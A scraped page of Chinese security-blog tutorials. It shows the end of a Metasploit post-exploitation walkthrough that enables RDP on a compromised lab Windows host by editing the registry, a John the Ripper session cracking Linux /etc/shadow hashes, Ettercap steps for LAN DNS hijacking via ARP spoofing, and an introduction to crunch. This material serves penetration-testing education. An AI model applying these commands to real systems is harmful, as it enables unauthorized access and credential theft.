-<h4 id="6-3-查看并启用-3389-远程连接端口"><a href="#6-3-查看并启用-3389-远程连接端口" class="headerlink" title="6.3 查看并启用 3389 远程连接端口"></a>6.3 查看并启用 3389 远程连接端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口状态（3389 端口是否开启）</span></span><br><span class="line">C:\Windows\system32&gt;netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       620</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       332</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       860</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1700</span><br><span class="line">  TCP    192.168.80.130:139     0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.80.130:49159   192.168.80.128:4444    ESTABLISHED     1044</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       620</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       332</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       452</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       896</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       860</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       428</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       1700</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    304</span><br><span class="line">  UDP    0.0.0.0:62440          *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:53830        *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:137     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:138     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:1900    *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:53829   *:*                                    1676</span><br><span class="line">  UDP    [::]:500               *:*                                    860</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:4500              *:*                                    860</span><br><span class="line">  UDP    [::]:5355              *:*                                    304</span><br><span class="line">  UDP    [::]:62441             *:*                                    1676</span><br><span class="line">  UDP    [::1]:1900             *:*                                    1676</span><br><span class="line">  UDP    [::1]:53828            *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:1900  *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:53827  *:*                                    1676</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 3389 远程连接端口</span></span><br><span class="line">C:\Windows\system32&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">The operation completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认端口是否开启</span></span><br><span class="line">C:\Windows\system32&gt;netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       620</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       304</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       332</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       860</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1700</span><br><span class="line">  TCP    192.168.80.130:139     0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.80.130:49159   192.168.80.128:4444    ESTABLISHED     1044</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       620</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       304</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       332</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       452</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       896</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       860</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       428</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       1700</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    304</span><br><span class="line">  UDP    0.0.0.0:62440          *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:53830        *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:137     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:138     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:1900    *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:53829   *:*                                    1676</span><br><span class="line">  UDP    [::]:500               *:*                                    860</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:4500              *:*                                    860</span><br><span class="line">  UDP    [::]:5355              *:*                                    304</span><br><span class="line">  UDP    [::]:62441             *:*                                    1676</span><br><span class="line">  UDP    [::1]:1900             *:*                                    1676</span><br><span class="line">  UDP    [::1]:53828            *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:546  *:*                                    896</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:1900  *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:53827  *:*                                    1676</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-4-启用远程桌面，进入目标机"><a href="#6-4-启用远程桌面，进入目标机" class="headerlink" title="6.4 启用远程桌面，进入目标机"></a>6.4 启用远程桌面，进入目标机</h4><p><img src="/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20221128012438324.png"></p>
-<p><img src="/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20221128012419130.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/27/john-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/27/john-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">john 使用教程</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-27 01:28:19 / 修改时间：02:21:34" itemprop="dateCreated datePublished" datetime="2022-11-27T01:28:19+08:00">2022-11-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一：John-概述"><a href="#一：John-概述" class="headerlink" title="一：John 概述"></a>一：John 概述</h1><p>开膛手约翰（John the Ripper）是一个快速的密码破解程序。</p>
-<p>其主要目的是检测弱 Unix 密码。</p>
-<h1 id="二：John-破解-Linux-密码"><a href="#二：John-破解-Linux-密码" class="headerlink" title="二：John 破解 Linux 密码"></a>二：John 破解 Linux 密码</h1><h2 id="2-1-相关文件"><a href="#2-1-相关文件" class="headerlink" title="2.1 相关文件"></a>2.1 相关文件</h2><p>Linux 系统中存放账号、密码的两个重要文件 &#x2F;etc&#x2F;passwd 与 &#x2F;etc&#x2F;shadow</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd		# 查看存放账户的文件内容</span><br><span class="line">cat /etc/passwd | head -1	</span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh	# 被&quot;:&quot;划分为7个字段</span><br><span class="line">用户名：密码：用户ID（UID）：用户组ID（GID）：描述信息：主目录：默认shell</span><br><span class="line"></span><br><span class="line">cat /etc/shadow 	# 查看存放账户密码的文件内容</span><br><span class="line">cat /etc/shadow | head -1	# 被&quot;:&quot;划分为9个字段</span><br><span class="line">root:$y$j9T$yRBeGeHrNuu/yNBeAEqn40$.ljB8e37.pNGJXOVLiDDJUTTCcA..R8rXJcUmFCuBcB:19321:0:99999:7:::</span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-破解密码"><a href="#2-2-破解密码" class="headerlink" title="2.2 破解密码"></a>2.2 破解密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将账户文件与密码文件合成一个文件</span></span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; shadow	</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 john 破解账户 ssh 密码</span></span><br><span class="line">john --format=crypt shadow </span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">使用默认输入编码：UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?/64])</span><br><span class="line">用3种不同的盐加载3个密码散列（crypt, generic crypt(3) [?/64]）</span><br><span class="line">Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes</span><br><span class="line">对于所有加载的哈希，成本1（算法[1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]）为0</span><br><span class="line">Cost 2 (algorithm specific iterations) is 1 for all loaded hashes</span><br><span class="line">对于所有加载的哈希，成本2（特定于算法的迭代）为1</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">单一进程，规则：单一</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">按 &#x27;q&#x27; 或者 Ctrl-C 终止，几乎任何其他状态键</span><br><span class="line">root             (root)     </span><br><span class="line">root             (ghost)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">基本完成：处理剩余的缓存候选密码（如果有）</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">继续处理单词列表：/usr/share/john/password.lst</span><br><span class="line">123456           (test)     </span><br><span class="line">3g 0:00:00:18 DONE 2/3 (2022-11-27 01:26) 0.1648g/s 82.08p/s 82.19c/s 82.19C/s 123456..pepper</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">使用 &quot;--show&quot; 选项可靠地显示所有破解的密码</span><br><span class="line">Session completed. </span><br><span class="line">会话完成。</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/27/Ettercap-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/27/Ettercap-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Ettercap 使用教程</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-27 00:24:59 / 修改时间：01:06:10" itemprop="dateCreated datePublished" datetime="2022-11-27T00:24:59+08:00">2022-11-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一：DNS-概述"><a href="#一：DNS-概述" class="headerlink" title="一：DNS 概述"></a>一：DNS 概述</h1><p>在网络中，机器之间只认识 IP 地址，机器之间最终都要通过IP来相互访问。但是为了方便记忆，可以为 IP 地址设置一个对应的域名，通过访问域名，就可以找到对应的 IP 地址的网站。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com</span><br><span class="line"></span><br><span class="line">正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=21ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=20ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=19ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=21ms TTL=54</span><br><span class="line"></span><br><span class="line">110.242.68.66 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 19ms，最长 = 21ms，平均 = 20ms</span><br></pre></td></tr></table></figure>
-
-<p>看似我们访问的是域名，而实际上是通过 IP 地址访问的百度。由 ping 命令，我们可以看出 baidu.com 到 110.242.68.66 的转换工作称为域名解析，域名解析需要专门的域名解析服务器来完成，DNS就是进行域名解析的服务器（Domain Name System 或者 Domain Name Service）。</p>
-<h1 id="二：DNS-原理"><a href="#二：DNS-原理" class="headerlink" title="二：DNS 原理"></a>二：DNS 原理</h1><p>DNS 查询时，会先在本地缓存中尝试查找，如果不存在或者记录过期，就继续向 DNS 服务器发起递归查询，这里的 DNS 服务器一般就是运营商的 DNS 服务器。</p>
-<ul>
-<li>第一步：客户机提出域名解析请求，并将该请求发送给本地的域名服务器。</li>
-<li>第二步：当本地的域名服务器收到请求后，就查询本地的缓存，如果有该记录项，则本地的域名服务器就直接把查询结果（域名对应的IP地址）返回。</li>
-<li>第三步：如果本地的缓存中没有该记录，则本地域名服务器就直接请求发给根域名服务器，然后根域名服务器再返回本地域名服务器一个所查询域（根的子域）的主域名服务器地址。</li>
-<li>第四步：本地服务器再向上一步返回的域名服务器发送请求，然后接受请求的服务器查询自己的缓存，如果没有该记录，则返回相关的下级的域名服务器地址。</li>
-<li>第五步：重复第四步，直到找到正确的记录。</li>
-<li>第六步：本地域名服务器把返回的结果保存到缓存，以备下一次使用，同时还将结果返回给客户机。</li>
-</ul>
-<h1 id="三：什么是-DNS-劫持"><a href="#三：什么是-DNS-劫持" class="headerlink" title="三：什么是 DNS 劫持"></a>三：什么是 DNS 劫持</h1><p>DNS 劫持又称域名劫持，是指通过某些手段取得某域名的解析控制权，修改此域名的解析结果，导致对该域名的访问由原 IP 地址转入到修改之后指定的 IP，其结果就是对特定网址不能访问或者访问的是假网址。</p>
-<p>如果可以冒充域名服务器，然后把查询的IP地址设置为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站主页，这就是DNS劫持的基本原理。</p>
-<p>DNS劫持其实并不是真的 “黑掉” 了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
-<h1 id="四：DNS-劫持危害"><a href="#四：DNS-劫持危害" class="headerlink" title="四：DNS 劫持危害"></a>四：DNS 劫持危害</h1><ul>
-<li>钓鱼诈骗<ul>
-<li>网上购物，网上支付有可能被恶意指向别的网站，泄密个人账户；</li>
-</ul>
-</li>
-<li>网站内出现恶意广告</li>
-<li>轻则影响网速，重则不能上网</li>
-</ul>
-<h1 id="五：Ettercap-进行内网-DNS-劫持"><a href="#五：Ettercap-进行内网-DNS-劫持" class="headerlink" title="五：Ettercap 进行内网 DNS 劫持"></a>五：Ettercap 进行内网 DNS 劫持</h1><ol>
-<li>准备欺骗页面，放在 &#x2F;var&#x2F;www&#x2F;html 目录下并启动</li>
-<li>配置 ettercap 工具配置文件<ul>
-<li>leafpad &#x2F;etc&#x2F;ettercap&#x2F;etter.dns</li>
-<li>注释记录→添加记录→保存退出</li>
-</ul>
-</li>
-<li>设置 ettercap 的配置<ul>
-<li>ettercap -G 启动 Ettercap</li>
-<li>启动嗅探→ 设置eth0网卡 → 扫描主机 → 将网关与主机添加到target选项 → 选择ARP欺骗 → 选择 DNS spoof 欺骗模块 → 点击start 开始欺骗</li>
-</ul>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/crunch-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/26/crunch-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">crunch 使用教程</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-26 16:07:25" itemprop="dateCreated datePublished" datetime="2022-11-26T16:07:25+08:00">2022-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-11-27 00:28:13" itemprop="dateModified" datetime="2022-11-27T00:28:13+08:00">2022-11-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>crunch 是一种创建密码字典的工具，按照指定的规则生成密码字典，可以灵活的定制自己的字典文件。</p>
-<p>使用 crunch 工具生成的密码可以输出到屏幕，保存到文件、或者另一个程序。</p>
-<p>crunch 最厉害的就是知道密码的一部分细节后，可以针对性的生成字典。</p>
-<h1 id="二：规则"><a href="#二：规则" class="headerlink" title="二：规则"></a>二：规则</h1><h2 id="2-1-生成方式"><a href="#2-1-生成方式" class="headerlink" title="2.1 生成方式"></a>2.1 生成方式</h2><p>crunch生成字典的方式：</p>
-<ol>
-<li>指定生成26个字母或者数字的随机字典</li>
-<li>指定格式生成字典</li>
-<li>指定模板生成字典</li>
-<li>指定字符串生成字典</li>
-</ol>
-<h2 id="2-2-参数详情"><a href="#2-2-参数详情" class="headerlink" title="2.2 参数详情"></a>2.2 参数详情</h2><ul>
-<li>min：设定最小字符串长度（必选）</li>
-<li>max：设定最大字符串长度（必选）</li>
-<li>-o 将生成的字典保存在指定文件</li>
-<li>-t 指定密码输出的格式</li>
-<li>-p 指定元素组合</li>
-<li>特殊字符<ul>
-<li>%：代表数字</li>
-<li>^：代表特殊符号</li>
-<li>@：代表小写字母</li>
-<li>.：代表大写字母</li>
-</ul>
-</li>
-</ul>
-<h1 id="三：命令"><a href="#三：命令" class="headerlink" title="三：命令"></a>三：命令</h1><h2 id="2-1-crunch"><a href="#2-1-crunch" class="headerlink" title="2.1 crunch"></a>2.1 crunch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crunch   </span><br><span class="line"></span><br><span class="line">crunch version 3.6</span><br><span class="line"></span><br><span class="line">Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.</span><br><span class="line">crunch 可以基于你指定的标准创建一个单词表。crunch的输出key发送到屏幕、文件或者另一个程序。</span><br><span class="line"></span><br><span class="line">Usage: crunch &lt;min&gt; &lt;max&gt; [options]</span><br><span class="line">用法：crunch &lt;最小&gt; &lt;最大&gt; [选项]</span><br><span class="line">where min and max are numbers</span><br><span class="line">其中最小值和最大值是数字</span><br><span class="line"></span><br><span class="line">Please refer to the man page for instructions and examples on how to use crunch.</span><br><span class="line">有关如何使用crunch，请参考手册页的说明和实例。</span><br></pre></td></tr></table></figure>
-
